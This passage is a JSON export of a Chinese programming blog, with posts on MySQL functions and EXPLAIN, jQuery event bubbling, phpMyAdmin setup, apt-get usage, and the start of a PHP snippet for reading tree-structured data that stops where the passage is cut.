-1ROUND(N,D)返回N的四舍五入值,保留D位小数(D的默认值为0)mysql&gt; select ROUND(-1.23);-&gt; -1mysql&gt; select ROUND(-1.58);-&gt; -2mysql&gt; select ROUND(1.58);-&gt; 2mysql&gt; select ROUND(1.298, 1);-&gt; 1.3mysql&gt; select ROUND(1.298, 0);-&gt; 1EXP(N)返回值e的N次方(自然对数的底)mysql&gt; select EXP(2);-&gt; 7.389056mysql&gt; select EXP(-2);-&gt; 0.135335LOG(N)返回N的自然对数mysql&gt; select LOG(2);-&gt; 0.693147mysql&gt; select LOG(-2);-&gt; NULLLOG10(N)返回N以10为底的对数mysql&gt; select LOG10(2);-&gt; 0.301030mysql&gt; select LOG10(100);-&gt; 2.000000mysql&gt; select LOG10(-100);-&gt; NULLPOW(X,Y)POWER(X,Y)返回值X的Y次幂mysql&gt; select POW(2,2);-&gt; 4.000000mysql&gt; select POW(2,-2);-&gt; 0.250000SQRT(N)返回非负数N的平方根mysql&gt; select SQRT(4);-&gt; 2.000000mysql&gt; select SQRT(20);-&gt; 4.472136PI()返回圆周率mysql&gt; select PI();-&gt; 3.141593COS(N)返回N的余弦值mysql&gt; select COS(PI());-&gt; -1.000000SIN(N)返回N的正弦值mysql&gt; select SIN(PI());-&gt; 0.000000TAN(N)返回N的正切值mysql&gt; select TAN(PI()+1);-&gt; 1.557408ACOS(N)返回N反余弦(N是余弦值,在-1到1的范围,否则返回NULL)mysql&gt; select ACOS(1);-&gt; 0.000000mysql&gt; select ACOS(1.0001);-&gt; NULLmysql&gt; select ACOS(0);-&gt; 1.570796ASIN(N)返回N反正弦值mysql&gt; select ASIN(0.2);-&gt; 0.201358mysql&gt; select ASIN(’foo’);-&gt; 0.000000ATAN(N)返回N的反正切值mysql&gt; select ATAN(2);-&gt; 1.107149mysql&gt; select ATAN(-2);-&gt; -1.107149ATAN2(X,Y)返回2个变量X和Y的反正切(类似Y/X的反正切,符号决定象限)mysql&gt; select ATAN(-2,2);-&gt; -0.785398mysql&gt; select ATAN(PI(),0);-&gt; 1.570796COT(N)返回X的余切mysql&gt; select COT(12);-&gt; -1.57267341mysql&gt; select COT(0);-&gt; NULLRAND()RAND(N)返回在范围0到1.0内的随机浮点值(可以使用数字N作为初始值)mysql&gt; select RAND();-&gt; 0.5925mysql&gt; select RAND(20);-&gt; 0.1811mysql&gt; select RAND(20);-&gt; 0.1811mysql&gt; select RAND();-&gt; 0.2079mysql&gt; select RAND();-&gt; 0.7888DEGREES(N)把N从弧度变换为角度并返回mysql&gt; select DEGREES(PI());-&gt; 180.000000RADIANS(N)把N从角度变换为弧度并返回 mysql&gt; select RADIANS(90);-&gt; 1.570796TRUNCATE(N,D)保留数字N的D位小数并返回mysql&gt; select TRUNCATE(1.223,1);-&gt; 1.2mysql&gt; select TRUNCATE(1.999,1);-&gt; 1.9mysql&gt; select TRUNCATE(1.999,0);-&gt; 1LEAST(X,Y,…)返回最小值(如果返回值被用在整数(实数或大小敏感字串)上下文或所有参数都是整数(实数或大小敏感字串)则他们作为整数(实数或大小敏感字串)比较,否则按忽略大小写的字符串被比较)mysql&gt; select LEAST(2,0);-&gt; 0mysql&gt; select LEAST(34.0,3.0,5.0,767.0);-&gt; 3.0mysql&gt; select LEAST(”B”,”A”,”C”);-&gt; “A”GREATEST(X,Y,…)返回最大值(其余同LEAST())mysql&gt; select GREATEST(2,0);-&gt; 2mysql&gt; select GREATEST(34.0,3.0,5.0,767.0);-&gt; 767.0mysql&gt; select GREATEST(”B”,”A”,”C”);-&gt; “C”时期时间函数DAYOFWEEK(date)返回日期date是星期几(1=星期天,2=星期一,……7=星期六,ODBC标准)mysql&gt; select DAYOFWEEK(’1998-02-03′);-&gt; 3WEEKDAY(date)返回日期date是星期几(0=星期一,1=星期二,……6= 星期天)。 mysql&gt; select WEEKDAY(’1997-10-04 22:23:00′);-&gt; 5mysql&gt; select WEEKDAY(’1997-11-05′);-&gt; 2DAYOFMONTH(date)返回date是一月中的第几日(在1到31范围内) mysql&gt; select DAYOFMONTH(’1998-02-03′);-&gt; 3DAYOFYEAR(date)返回date是一年中的第几日(在1到366范围内) mysql&gt; select DAYOFYEAR(’1998-02-03′);-&gt; 34MONTH(date)返回date中的月份数值 mysql&gt; select MONTH(’1998-02-03′);-&gt; 2DAYNAME(date)返回date是星期几(按英文名返回)mysql&gt; select DAYNAME(”1998-02-05″);-&gt; ‘Thursday’MONTHNAME(date)返回date是几月(按英文名返回)mysql&gt; select MONTHNAME(”1998-02-05″);-&gt; ‘February’QUARTER(date)返回date是一年的第几个季度mysql&gt; select QUARTER(’98-04-01′);-&gt; 2WEEK(date,first)返回date是一年的第几周(first默认值0,first取值1表示周一是周的开始,0从周日开始)mysql&gt; select WEEK(’1998-02-20′);-&gt; 7mysql&gt; select WEEK(’1998-02-20′,0);-&gt; 7mysql&gt; select WEEK(’1998-02-20′,1);-&gt; 8YEAR(date)返回date的年份(范围在1000到9999) mysql&gt; select YEAR(’98-02-03′);-&gt; 1998HOUR(time)返回time的小时数(范围是0到23) mysql&gt; select HOUR(’10:05:03′);-&gt; 10MINUTE(time)返回time的分钟数(范围是0到59) mysql&gt; select MINUTE(’98-02-03 10:05:03′);-&gt; 5SECOND(time)返回time的秒数(范围是0到59) mysql&gt; select SECOND(’10:05:03′);-&gt; 3PERIOD_ADD(P,N)增加N个月到时期P并返回(P的格式YYMM或YYYYMM) mysql&gt; select PERIOD_ADD(9801,2);-&gt; 199803PERIOD_DIFF(P1,P2)返回在时期P1和P2之间月数(P1和P2的格式YYMM或YYYYMM)mysql&gt; select PERIOD_DIFF(9802,199703);-&gt; 11DATE_ADD(date,INTERVAL expr type)DATE_SUB(date,INTERVAL expr type)ADDDATE(date,INTERVAL expr type)SUBDATE(date,INTERVAL expr type)对日期时间进行加减法运算(ADDDATE()和SUBDATE()是DATE_ADD()和DATE_SUB()的同义词,也可以用运算符+和-而不是函数date是一个DATETIME或DATE值,expr对date进行加减法的一个表达式字符串type指明表达式expr应该如何被解释[type值 含义 期望的expr格式]:SECOND 秒 SECONDSMINUTE 分钟 MINUTESHOUR 时间 HOURSDAY 天 DAYSMONTH 月 MONTHSYEAR 年 YEARSMINUTE_SECOND 分钟和秒 “MINUTES:SECONDS”HOUR_MINUTE 小时和分钟 “HOURS:MINUTES”DAY_HOUR 天和小时 “DAYS HOURS”YEAR_MONTH 年和月 “YEARS-MONTHS”HOUR_SECOND 小时, 分钟， “HOURS:MINUTES:SECONDS”DAY_MINUTE 天, 小时, 分钟 “DAYS HOURS:MINUTES”DAY_SECOND 天, 小时, 分钟, 秒 “DAYS HOURS:MINUTES:SECONDS”expr中允许任何标点做分隔符,如果所有是DATE值时结果是一个DATE值,否则结果是一个DATETIME值)如果type关键词不完整,则MySQL从右端取值,DAY_SECOND因为缺少小时分钟等于MINUTE_SECOND)如果增加MONTH、YEAR_MONTH或YEAR,天数大于结果月份的最大天数则使用最大天数)mysql&gt; SELECT “1997-12-31 23:59:59″ + INTERVAL 1 SECOND;-&gt; 1998-01-01 00:00:00mysql&gt; SELECT INTERVAL 1 DAY + “1997-12-31″;-&gt; 1998-01-01mysql&gt; SELECT “1998-01-01″ – INTERVAL 1 SECOND;-&gt; 1997-12-31 23:59:59mysql&gt; SELECT DATE_ADD(”1997-12-31 23:59:59″,INTERVAL 1 SECOND);-&gt; 1998-01-01 00:00:00mysql&gt; SELECT DATE_ADD(”1997-12-31 23:59:59″,INTERVAL 1 DAY);-&gt; 1998-01-01 23:59:59mysql&gt; SELECT DATE_ADD(”1997-12-31 23:59:59″,INTERVAL “1:1″ MINUTE_SECOND);-&gt; 1998-01-01 00:01:00mysql&gt; SELECT DATE_SUB(”1998-01-01 00:00:00″,INTERVAL “1 1:1:1″ DAY_SECOND);-&gt; 1997-12-30 22:58:59mysql&gt; SELECT DATE_ADD(”1998-01-01 00:00:00″, INTERVAL “-1 10″ DAY_HOUR);-&gt; 1997-12-30 14:00:00mysql&gt; SELECT DATE_SUB(”1998-01-02″, INTERVAL 31 DAY);-&gt; 1997-12-02mysql&gt; SELECT EXTRACT(YEAR FROM “1999-07-02″);-&gt; 1999mysql&gt; SELECT EXTRACT(YEAR_MONTH FROM “1999-07-02 01:02:03″);-&gt; 199907mysql&gt; SELECT EXTRACT(DAY_MINUTE FROM “1999-07-02 01:02:03″);-&gt; 20102TO_DAYS(date)返回日期date是西元0年至今多少天(不计算1582年以前)mysql&gt; select TO_DAYS(950501);-&gt; 728779mysql&gt; select TO_DAYS(’1997-10-07′);-&gt; 729669FROM_DAYS(N)给出西元0年至今多少天返回DATE值(不计算1582年以前) mysql&gt; select FROM_DAYS(729669);-&gt; ‘1997-10-07′DATE_FORMAT(date,format)根据format字符串格式化date值(在format字符串中可用标志符:%M 月名字(January……December)%W 星期名字(Sunday……Saturday)%D 有英语前缀的月份的日期(1st, 2nd, 3rd, 等等。）%Y 年, 数字, 4 位%y 年, 数字, 2 位%a 缩写的星期名字(Sun……Sat)%d 月份中的天数, 数字(00……31)%e 月份中的天数, 数字(0……31)%m 月, 数字(01……12)%c 月, 数字(1……12)%b 缩写的月份名字(Jan……Dec)%j 一年中的天数(001……366)%H 小时(00……23)%k 小时(0……23)%h 小时(01……12)%I 小时(01……12)%l 小时(1……12)%i 分钟, 数字(00……59)%r 时间,12 小时(hh:mm:ss [AP]M)%T 时间,24 小时(hh:mm:ss)%S 秒(00……59)%s 秒(00……59)%p AM或PM%w 一个星期中的天数(0=Sunday ……6=Saturday ）%U 星期(0……52), 这里星期天是星期的第一天%u 星期(0……52), 这里星期一是星期的第一天%% 字符% )mysql&gt; select DATE_FORMAT(’1997-10-04 22:23:00′,’%W %M %Y’);-&gt; ‘Saturday October 1997′mysql&gt; select DATE_FORMAT(’1997-10-04 22:23:00′,’%H:%i:%s’);-&gt; ‘22:23:00′mysql&gt; select DATE_FORMAT(’1997-10-04 22:23:00′,’%D %y %a %d %m %b %j’);-&gt; ‘4th 97 Sat 04 10 Oct 277′mysql&gt; select DATE_FORMAT(’1997-10-04 22:23:00′,’%H %k %I %r %T %S %w’);-&gt; ‘22 22 10 10:23:00 PM 22:23:00 00 6′TIME_FORMAT(time,format)和DATE_FORMAT()类似,但TIME_FORMAT只处理小时、分钟和秒(其余符号产生一个NULL值或0)CURDATE()CURRENT_DATE()以’YYYY-MM-DD’或YYYYMMDD格式返回当前日期值(根据返回值所处上下文是字符串或数字)mysql&gt; select CURDATE();-&gt; ‘1997-12-15′mysql&gt; select CURDATE() + 0;-&gt; 19971215CURTIME()CURRENT_TIME()以’HH:MM:SS’或HHMMSS格式返回当前时间值(根据返回值所处上下文是字符串或数字) mysql&gt; select CURTIME();-&gt; ‘23:50:26′mysql&gt; select CURTIME() + 0;-&gt; 235026NOW()SYSDATE()CURRENT_TIMESTAMP()以’YYYY-MM-DD HH:MM:SS’或YYYYMMDDHHMMSS格式返回当前日期时间(根据返回值所处上下文是字符串或数字)mysql&gt; select NOW();-&gt; ‘1997-12-15 23:50:26′mysql&gt; select NOW() + 0;-&gt; 19971215235026UNIX_TIMESTAMP()UNIX_TIMESTAMP(date)返回一个Unix时间戳(从’1970-01-01 00:00:00′GMT开始的秒数,date默认值为当前时间)mysql&gt; select UNIX_TIMESTAMP();-&gt; 882226357mysql&gt; select UNIX_TIMESTAMP(’1997-10-04 22:23:00′);-&gt; 875996580FROM_UNIXTIME(unix_timestamp)以’YYYY-MM-DD HH:MM:SS’或YYYYMMDDHHMMSS格式返回时间戳的值(根据返回值所处上下文是字符串或数字) mysql&gt; select FROM_UNIXTIME(875996580);-&gt; ‘1997-10-04 22:23:00′mysql&gt; select FROM_UNIXTIME(875996580) + 0;-&gt; 19971004222300FROM_UNIXTIME(unix_timestamp,format)以format字符串格式返回时间戳的值mysql&gt; select FROM_UNIXTIME(UNIX_TIMESTAMP(),’%Y %D %M %h:%i:%s %x’);-&gt; ‘1997 23rd December 03:43:30 x’SEC_TO_TIME(seconds)以’HH:MM:SS’或HHMMSS格式返回秒数转成的TIME值(根据返回值所处上下文是字符串或数字) mysql&gt; select SEC_TO_TIME(2378);-&gt; ‘00:39:38′mysql&gt; select SEC_TO_TIME(2378) + 0;-&gt; 3938TIME_TO_SEC(time)返回time值有多少秒 mysql&gt; select TIME_TO_SEC(’22:23:00′);-&gt; 80580mysql&gt; select TIME_TO_SEC(’00:39:38′);-&gt; 2378 来自：http://www.cnblogs.com/dddm/archive/2012/03/31/2427259.html","categories":[],"tags":[]},{"title":"mysql explain详解","slug":"mysql/mysql explain详解","date":"2013-07-02T10:12:40.000Z","updated":"2019-08-26T06:09:54.318Z","comments":true,"path":"2013/07/02/mysql/mysql explain详解/","link":"","permalink":"http://ningmo.github.io/2013/07/02/mysql/mysql explain详解/","excerpt":"","text":"对于经常使用mysql的兄弟们，对explain一定不会陌生。当你在一条SELECT语句前放上关键词EXPLAIN，MySQL解释它将如何处理SELECT，提供有关表如何联合和以什么次序的信息。借助于EXPLAIN，你可以知道1)你什么时候必须为表加入索引以得到一个使用索引找到记录的更快的SELECT。2)你也能知道优化器是否以一个最佳次序联结表。为了强制优化器对一个SELECT语句使用一个特定联结次序，增加一个STRAIGHT_JOIN子句。官方的关于explain的文档在http://dev.mysql.com/doc/refman/5.1/en/using-explain.html（英文），本文可作为官方文献的不完整通俗读物。 使用的方法 1EXPLAIN tbl_name 或： 1EXPLAIN [EXTENDED] SELECT select_options 前者可以得出一个表的字段结构等等，后者主要是给出相关的一些索引信息，而今天要讲述的重点是后者。 举例 1234567mysql&gt; explain select * from event;+----+-------------+-------+------+---------------+------+---------+------+------+-------+| id | select_type | table | type | possible_keys | key | key_len | ref | rows | Extra |+----+-------------+-------+------+---------------+------+---------+------+------+-------+| 1 | SIMPLE | event | ALL | NULL | NULL | NULL | NULL | 13 | |+----+-------------+-------+------+---------------+------+---------+------+------+-------+1 row in set (0.00 sec) 各个属性的含义idselect查询的序列号 select_typeselect查询的类型，主要是区别普通查询和联合查询、子查询之类的复杂查询。 table输出的行所引用的表。 type联合查询所使用的类型。type显示的是访问类型，是较为重要的一个指标，结果值从好到坏依次是： 1system &gt; const &gt; eq_ref &gt; ref &gt; fulltext &gt; ref_or_null &gt; index_merge &gt; unique_subquery &gt; index_subquery &gt; range &gt; index &gt; ALL 一般来说，得保证查询至少达到range级别，最好能达到ref。 possible_keys指出MySQL能使用哪个索引在该表中找到行。如果是空的，没有相关的索引。这时要提高性能，可通过检验WHERE子句，看是否引用某些字段，或者检查字段不是适合索引。 key显示MySQL实际决定使用的键。如果没有索引被选择，键是NULL。 key_len显示MySQL决定使用的键长度。如果键是NULL，长度就是NULL。文档提示特别注意这个值可以得出一个多重主键里mysql实际使用了哪一部分。 ref显示哪个字段或常数与key一起被使用。 rows这个数表示mysql要遍历多少数据才能找到，在innodb上是不准确的。 Extra如果是Only index，这意味着信息只用索引树中的信息检索出的，这比扫描整个表要快。如果是where used，就是使用上了where限制。如果是impossible where 表示用不着where，一般就是没查出来啥。如果此信息显示Using filesort或者Using temporary的话会很吃力，WHERE和ORDER BY的索引经常无法兼顾，如果按照WHERE来确定索引，那么在ORDER BY时，就必然会引起Using filesort，这就要看是先过滤再排序划算，还是先排序再过滤划算。 常见的一些名词解释Using filesortMySQL需要额外的一次传递，以找出如何按排序顺序检索行。 Using index从只使用索引树中的信息而不需要进一步搜索读取实际的行来检索表中的列信息。 Using temporary为了解决查询，MySQL需要创建一个临时表来容纳结果。 ref对于每个来自于前面的表的行组合，所有有匹配索引值的行将从这张表中读取 ALL完全没有索引的情况，性能非常地差劲。 index与ALL相同，除了只有索引树被扫描。这通常比ALL快，因为索引文件通常比数据文件小。 SIMPLE简单SELECT(不使用UNION或子查询) 本文提及的文章http://dev.mysql.com/doc/refman/5.1/en/using-explain.html http://dev.mysql.com/doc/refman/5.1/zh/optimization.html#explain 原创文章如转载，请注明：转载自五四陈科学院[http://www.54chen.com]","categories":[],"tags":[]},{"title":"什么是JS事件冒泡?\"","slug":"js/什么是JS事件冒泡","date":"2013-06-20T06:04:36.000Z","updated":"2019-08-26T08:25:04.023Z","comments":true,"path":"2013/06/20/js/什么是JS事件冒泡/","link":"","permalink":"http://ningmo.github.io/2013/06/20/js/什么是JS事件冒泡/","excerpt":"","text":"什么是JS事件冒泡？： 在一个对象上触发某类事件（比如单击onclick事件），如果此对象定义了此事件的处理程序，那么此事件就会调用这个处理程序，如果没有定义此事件处理程序或者事件返回true，那么这个事件会向这个对象的父级对象传播，从里到外，直至它被处理（父级对象所有同类事件都将被激活），或者它到达了对象层次的最顶层，即document对象（有些浏览器是window）。 如何来阻止Jquery事件冒泡？ 通过一个小例子来解释 12345678&lt;html xmlns=\"http://www.w3.org/1999/xhtml\"&gt;&lt;script src=\"jquery-1.3.2-vsdoc.js\" type=\"text/javascript\"&gt;&lt;/script&gt; &lt;body&gt; &lt;form id=\"form1\" runat=\"server\"&gt; &lt;div id=\"divOne\" onclick=\"alert('我是最外层');\"&gt; &lt;div id=\"divTwo\" onclick=\"alert('我是中间层！')\"&gt; &lt;a id=\"hr_three\" href=\"http://www.baidu.com\" mce_href=\"http://www.baidu.com\" onclick=\"alert('我是最里层！')\"&gt;点击我&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 比如上面这个页面， 分为三层：divOne是第外层，divTwo中间层，hr_three是最里层; 他们都有各自的click事件，最里层a标签还有href属性。 运行页面，点击“点击我”,会依次弹出：我是最里层—-&gt;我是中间层—-&gt;我是最外层 —-&gt;然后再链接到百度. 这就是事件冒泡，本来我只点击ID为hr_three的标签，但是确执行了三个alert操作。 事件冒泡过程（以标签ID表示）：hr_three—-&gt; divTwo—-&gt; divOne 。从最里层冒泡到最外层。 如何来阻止? 12345678910111.event.stopPropagation(); &lt;script type=\"text/javascript\"&gt; $(function() &#123; $(\"#hr_three\").click(function(event) &#123; event.stopPropagation(); &#125;); &#125;);&lt;script&gt; 再点击“点击我”，会弹出：我是最里层，然后链接到百度 2.return false; 如果头部加入的是以下代码 1&lt;script type=\"text/javascript\"&gt; $(function() &#123;$(\"#hr_three\").click(function(event) &#123; return false;&#125;);&#125;); &lt;script&gt; 再点击“点击我”，会弹出：我是最里层，但不会执行链接到百度页面 由此可以看出： 1.event.stopPropagation(); 事件处理过程中，阻止了事件冒泡，但不会阻击默认行为（它就执行了超链接的跳转） 2.return false; 事件处理过程中，阻止了事件冒泡，也阻止了默认行为（比如刚才它就没有执行超链接的跳转） 还有一种有冒泡有关的： 3.event.preventDefault(); 如果把它放在头部A标签的click事件中，点击“点击我”。 会发现它依次弹出：我是最里层—-&gt;我是中间层—-&gt;我是最外层，但最后却没有跳转到百度 它的作用是：事件处理过程中，不阻击事件冒泡，但阻击默认行为（它只执行所有弹框，却没有执行超链接跳转）","categories":[{"name":"js","slug":"js","permalink":"http://ningmo.github.io/categories/js/"}],"tags":[]},{"title":"phpMyAdmin安装配置方法全过程，及问题解决","slug":"php/phpMyAdmin安装配置方法全过程，及问题解决","date":"2013-03-30T04:04:13.000Z","updated":"2019-08-26T06:09:54.326Z","comments":true,"path":"2013/03/30/php/phpMyAdmin安装配置方法全过程，及问题解决/","link":"","permalink":"http://ningmo.github.io/2013/03/30/php/phpMyAdmin安装配置方法全过程，及问题解决/","excerpt":"","text":"1、先下载phpMyAdmin安装包：到国外官方网站http://www.phpmyadmin.net上，点击导航栏上的“DOWNLOADS”链接进入下载页面，选择“all-languages.zip”版本下载到本地，解压；把解压缩文件放到系统指定的虚拟根目录下的phpmyadmin文件夹里（可自定义文件夹名），如flymorn的本地存放位置是D:\\www\\phpmyadmin里。 &nbsp; 2、找到phpmyadmin文件夹里的/libraries/config.default.php文件(旧版本是根目录下的config.inc.php文件)，用支持UTF-8编码的写字板打开进行编辑。 &nbsp; 3、查找 $cfg[‘PmaAbsoluteUri’]修改为你将上传到空间的phpMyAdmin的网址如：$cfg[‘PmaAbsoluteUri’] = ‘http://www.piaoyi.org/phpmyadmin/&#39;;这里因为我是本地调试，我改为$cfg[‘PmaAbsoluteUri’] = ‘http://localhost/phpmyadmin/&#39;;注意：不要漏掉最后的反斜杠/和开头的http。 &nbsp; 4、查找 $cfg[‘Servers’][$i][‘host’] = ‘localhost’;（通常用默认，也有例外，可以不用修改） &nbsp; 5、查找 $cfg[‘Servers’][$i][‘auth_type’] = ‘config’;在自己的机子里调试用config；如果在网络上的空间用cookie，这里我们既然在前面已经添加了网址，就修改成cookie。我个人建议：无论是本地还是网络上，都建议设置成cookie，安全第一。同时，当auth_type这个值设置为cookie后，还有一个地方需要作出相应的修改：$cfg[‘blowfish_secret’] = ‘’;改成：$cfg[‘blowfish_secret’] = ‘www.piaoyi.org&#39;;这里的www.piaoyi.org自己随便定义，不超过46个字符。如果这个地方留空，将会出现上文提到的第2个错误：“配置文件现在需要绝密的短语密码(blowfish_secret)”。 &nbsp; 6、查找 $cfg[‘Servers’][$i][‘user’] = ‘root’; // MySQL user（用户名，自己机里用root；在网上一般为你的ftp用户名，虚拟主机提供商会告诉你的；一般不要修改） &nbsp; 7、查找 $cfg[‘Servers’][$i][‘password’] = ‘123456’; // MySQL password （123456修改成连接你的MYSQL数据库的用户密码） &nbsp; 8、查找 $cfg[‘DefaultLang’] = ‘zh’; （这里是选择语言，zh代表简体中文的意思） 还有 $cfg[‘DefaultCharset’] = ‘gb2312’;（修改默认编码为国标） &nbsp; 到这里，phpMyAdmin就已经配置完成OK；你可以打开http://localhost/phpmyadmin/访问方便快捷的图形化管理软件phpMyAdmin了。关于本文没有提到的配置文件里的其他选项，大家可以不用关心了也不必修改。关于具体如何操作phpMyAdmin不在本文讨论的范围内，不过图形化界面，是通俗易懂，稍微看看就会用了（参考）。 &nbsp; 下面谈谈，flymorn在安装配置phpMyAdmin的过程中所遇到的几个问题。 &nbsp; 第一个问题：“无法载入mcrypt扩展，请检查PHP配置”。 &nbsp; 1、没有正确安装Mysql数据库，在系统服务中Mysql相关的服务没有启动。2、在系统的 system32（C:\\windows\\system32） 目录下缺少 libmcrypt.dll文件，解决方法是找到php目录下的libmcrypt.dll，并将libmcrypt.dll复制到C:\\windows\\system32目录中，然后重新启动Web服务。3、在PHP目录下的php.ini文件中，没有将“;extension=php_mcrypt.dll”中的前面一个“;”去掉，所以不能使用相应功能，解决方法是打开php.ini文件，找到;extension=php_mcrypt.dll改成extension=php_mcrypt.dll //去掉前面的;使之生效4、Mysql目录没有读取权限，正确的目录权限如下：administrator 完全控制system 完全控制user 读取加运行其他的用户权限全部删除（也可保留，但安全性不高，建议删除），然后重启MYsql服务和Web服务（建议修改此项后重启一下服务器）。5、以上方法都不行的话，再用这个方法：桌面&gt;我的电脑&gt;右键属性&gt;高级&gt;环境变量&gt;系统变量&gt;新建名：phpdir值：C:\\php(你的PHP在什么目录就是什么)（参考来源：地址） &nbsp; 第二个问题：“无法载入 mysql 扩展，请检查 PHP 配置” &nbsp; 把 PHP 目录下的 libmySQL.dll 复制到:c:\\windows\\system32 下，然后重启APACHE。 &nbsp; 第三个问题：“配置文件现在需要绝密的短语密码(blowfish_secret)” &nbsp; 确保在config.default.php文件里面进行了正确的设置 ：$cfg[‘Servers’][$i][‘auth_type’]= ‘cookie’;同时$cfg[‘blowfish_secret’] = ‘www.piaoyi.org&#39;; //（这个值随便写，就是不能留空） &nbsp; 其实这个问题，我碰到了确实很郁闷，如果按照我在上面提到的配置方法做了，应该不会提示这个错误。经过我2个多小时不停的修改config.default.php配置文件，始终提示这个错误，几乎达到了崩溃的边缘了。 &nbsp; 然后就是灵光一现，突然发现：我把auth_type认证方式改为http，改为config时，打开页面始终出现这个错误，也就是说改变了认证模式，并没有对phpmyadmin起作用，难道是其他的配置文件在影响决定着phpmyadmin？ &nbsp; 立马来到phpmyadmin根目录，赫然发现根目录下有一个config.sample.inc.php文件存在的同时，还有一个文件config.inc.php也存在！！而这个是以前老版本的配置文件，原来是这个文件捣的鬼。马上删除config.inc.php，再进入调试页面，错误消失了！问题解决。 &nbsp; 看来phpmyadmin根目录下的config.inc.php配置文件的优先级比/libraries/config.default.php的配置文件高，系统是先调用根目录里的配置文件，然后才是libraries文件夹里的配置文件，艾，这个问题，折腾了这么久，呜呼哀哉。总归解决了，舒一口气啊。 &nbsp; 第四个问题：“#2003-服务器没有响应”。 &nbsp; 遇到这个问题多半是MYSQL数据库没有启动，建议直接在在：控制面板-管理工具-服务里面把MYSQL启动。关于是否启动，你可以在任务管理器里查看是否有“mysqld-nt.exe”这样的进程，如有有，则说明mysql已经启动。 第五个问题：“没有发现PHP的扩展设置mbstring”。 &nbsp; 修改 C:\\WINDOWS\\ 下的 PHP.INI 文件，找到 ;extension=php_mbstring.dll 把;去掉，保存 PHP.INI，重新启动Apache即可。 &nbsp; 这些问题，不碰到便罢了。但是对于新手来说，第一次碰到的话，自己查找解决方案的话一般都是到处查找，网上一大堆的方法都不适用的情况下，自己会感觉到多么的无奈了。我还是建议，遇到问题不要着急，仔细阅读文档，多参考下前辈们的解决方法，虽然不一定适用，但对你会有一定的启发。多动手，多试验，没有任何问题可以难倒你。 &nbsp; &nbsp; 来源：http://www.piaoyi.org/php/phpMyAdmin-install-method-faqs.html","categories":[],"tags":[]},{"title":"apt-get 命令详解","slug":"linux/apt-get 命令详解","date":"2013-03-25T14:35:11.000Z","updated":"2019-08-26T06:09:54.310Z","comments":true,"path":"2013/03/25/linux/apt-get 命令详解/","link":"","permalink":"http://ningmo.github.io/2013/03/25/linux/apt-get 命令详解/","excerpt":"","text":"一，什么的是apt-get 高级包装工具（英语：Advanced Packaging Tools,简称：APT）是Debian及其衍生发行版（如：ubuntu）的软件包管理器。APT可以自动下载，配置，安装二进制或者源代码格式的软件包，因此简化了 Unix系统上管理软件的过程,apt-get命令一般需要root权限执行，所以一般跟着sudo命令。它根yum ,pacman,installpkg等性质差不多，是系统软件的管理工具。会用其中一种基本上都会用了。 二，apt-get中文参数 123用法：apt-get [选项] 命令 apt-get [选项] install|remove pkg1 [pkg2 ...] apt-get [选项] source pkg1 [pkg2 ...] apt-get 是一个下载安装软件包的简单命令行接口。 最常用的命令是update(更新) 和install(安装)。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950 命令： update - 重新获取软件包列表 upgrade - 进行更新 install - 安装新的软件包 remove - 移除软件包 autoremove - 自动移除全部不使用的软件包 purge - 移除软件包和配置文件 source - 下载源码档案 build-dep - 为源码包配置编译依赖 dist-upgrade - 发行版升级, 参见 apt-get(8) dselect-upgrade - 依照 dselect 的选择更新 clean - 清除下载的归档文件 autoclean - 清除旧的的已下载的归档文件 check - 检验是否有损坏的依赖 选项： -h 本帮助文件。 -q 输出到日志 - 无进展指示 -qq 不输出信息，错误除外 -d 仅下载 - 不安装或解压归档文件 -s 不实际安装。模拟执行命令 -y 假定对所有的询问选是，不提示 -f 尝试修正系统依赖损坏处 -m 如果归档无法定位，尝试继续 -u 同时显示更新软件包的列表 -b 获取源码包后编译 -V 显示详细的版本号 -c=? 阅读此配置文件 -o=? 设置自定的配置选项，如 -o dir::cache=/tmp 三，apt-get 常用实例apt-cache search packagename 搜索包apt-cache show packagename 获取包的相关信息，如说明、大小、版本等apt-get install packagename 安装包apt-get install packagename - - reinstall 重新安装包apt-get -f install 修复安装&quot;-f = --fix-missing&quot;apt-get remove packagename 删除包apt-get remove packagename - - purge 删除包，包括删除配置文件等apt-get update 更新源apt-get upgrade 更新已安装的包apt-get dist-upgrade 升级系统apt-get dselect-upgrade 使用 dselect 升级apt-cache depends packagename 了解使用依赖apt-cache rdepends packagename 是查看该包被哪些包依赖apt-get build-dep packagename 安装相关的编译环境apt-get source packagename 下载该包的源代码apt-get clean 清理无用的包apt-get autoclean 清理无用的包apt-get check 检查是否有损坏的依赖 地址:http://blog.51yip.com/linux/1176.html","categories":[],"tags":[]},{"title":"用户在线与离线","slug":"php/用户在线与离线","date":"2013-03-23T15:16:53.000Z","updated":"2019-08-26T06:09:54.331Z","comments":true,"path":"2013/03/23/php/用户在线与离线/","link":"","permalink":"http://ningmo.github.io/2013/03/23/php/用户在线与离线/","excerpt":"","text":"思路： 记录用户每个操作的时间，定时更新数据库中用户最后操作时间 设定默认时间用户无操作为离线， 获取用户最后操作时间并加上默认时间值， 与当前时间进行对比， 大于则在线，小于则离线。","categories":[{"name":"php","slug":"php","permalink":"http://ningmo.github.io/categories/php/"}],"tags":[]},{"title":"读取树状数据的方法","slug":"mysql/读取树状数据的方法","date":"2013-03-23T14:46:55.000Z","updated":"2019-08-26T06:09:54.323Z","comments":true,"path":"2013/03/23/mysql/读取树状数据的方法/","link":"","permalink":"http://ningmo.github.io/2013/03/23/mysql/读取树状数据的方法/","excerpt":"","text":"读取树状数据的方法一般在读取用“邻接列表算法”组织的数据时，需要使用递归逐层读取或者读取数据到数组，然后用递归或非递归的方法再行处理这里介绍一种边读边生成“树状”数组的方法 123456789101112131415161718192021222324252627282930mysql_connect();//测试数据$sql =&lt;&lt;&lt; SQLselect * from ( select &apos;1&apos; as id, &apos;0&apos; as pid, &apos;Food&apos; as title union all select &apos;2&apos;, &apos;1&apos;, &apos;Fruit&apos; union all select &apos;3&apos;, &apos;2&apos;, &apos;Red&apos; union all select &apos;4&apos;, &apos;3&apos;, &apos;Cherry&apos; union all select &apos;5&apos;, &apos;2&apos;, &apos;Yellow&apos; union all select &apos;6&apos;, &apos;5&apos;, &apos;Banana&apos; union all select &apos;7&apos;, &apos;1&apos;, &apos;Meat&apos; union all select &apos;8&apos;, &apos;7&apos;, &apos;Beef&apos; union all select &apos;9&apos;, &apos;7&apos;, &apos;Pork&apos; ) t order by pid, idSQL;$rs = mysql_query($sql);$res = array(); //结果数组$ind = array(); //索引数组while($row = 